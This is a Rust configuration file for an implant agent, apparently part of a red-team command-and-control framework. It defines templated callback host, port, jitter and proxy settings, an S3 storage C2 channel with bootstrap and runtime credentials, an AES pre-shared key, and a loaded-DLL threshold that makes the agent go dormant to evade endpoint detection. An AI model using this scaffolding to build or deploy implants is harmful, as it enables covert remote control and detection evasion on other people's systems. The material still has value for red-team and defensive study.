use once_cell::sync::Lazy;
use std::sync::RwLock;

pub static UUID: Lazy<RwLock<String>> = Lazy::new(|| RwLock::new(String::from("%UUID%")));

pub static callback_host: &str = "%HOSTNAME%";
pub static post_uri: &str = "%ENDPOINT%";
pub static callback_port: &str = "%PORT%";
pub static user_agent: &str = "%USERAGENT%";
pub static proxy_host: &str = "%PROXYURL%";
pub static callback_interval: u64 = %SLEEPTIME%;
pub static callback_jitter: u64 = %JITTER%;
pub static chunk_size: usize = %CHUNKSIZE%;
pub static use_ssl : bool = false; // TODO: %SSL%
pub static use_proxy: bool = false; // TODO: %PROXYENABLED%

// S3 Storage C2 configuration (stamped at build time)
pub static use_s3: bool = %USE_S3%;
pub static s3_endpoint: &str = "%S3_ENDPOINT%";
pub static s3_bucket: &str = "%S3_BUCKET%";
pub static s3_region: &str = "%S3_REGION%";

// Bootstrap credentials (used only during registration)
pub static s3_payload_prefix: &str = "%S3_PAYLOAD_PREFIX%";
pub static s3_bootstrap_access_key_id: &str = "%S3_BOOTSTRAP_ACCESS_KEY_ID%";
pub static s3_bootstrap_secret_access_key: &str = "%S3_BOOTSTRAP_SECRET_ACCESS_KEY%";

// Pre-shared key for EKE (base64-encoded, empty if encryption disabled)
pub static AESPSK: &str = "%AESPSK%";

// EDR detection: max number of loaded DLLs before going dormant
pub static MAX_LOADED_DLLS: usize = 20;

// Runtime exec credentials (populated after bootstrap registration)
pub static S3_EXEC_ACCESS_KEY: Lazy<RwLock<String>> = Lazy::new(|| RwLock::new(String::new()));
pub static S3_EXEC_SECRET_KEY: Lazy<RwLock<String>> = Lazy::new(|| RwLock::new(String::new()));
pub static S3_EXEC_PREFIX: Lazy<RwLock<String>> = Lazy::new(|| RwLock::new(String::new()));

// Session key for AES-256-CBC encryption (populated during EKE)
pub static SESSION_KEY: Lazy<RwLock<Vec<u8>>> = Lazy::new(|| RwLock::new(Vec::new()));
